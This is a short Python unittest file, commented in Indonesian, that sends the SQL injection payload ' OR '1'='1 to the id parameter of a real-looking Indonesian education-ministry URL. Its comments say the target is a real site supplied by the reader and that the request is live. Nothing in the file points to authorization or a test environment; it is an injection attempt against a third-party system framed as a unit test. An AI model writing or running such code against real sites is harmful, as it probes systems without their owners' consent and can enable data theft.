import unittest
import sql_injection_web

class TestSqlInjectionWebReal(unittest.TestCase):

    def setUp(self):
        # Mengganti dengan URL target nyata yang Anda berikan
        self.test_url = "https://tpa.bppp.kemdikbud.go.id/tbm/?id=1"
        self.param = "id"

    def test_inject_payload_real(self):
        payload = "' OR '1'='1"
        response = sql_injection_web.inject_payload(self.test_url, self.param, payload)
        # Karena ini request nyata, kita hanya cek response tidak None
        self.assertIsNotNone(response)
        # Anda juga bisa menambahkan pemeriksaan lainnya sesuai response nyata di sini

if __name__ == '__main__':
    unittest.main()
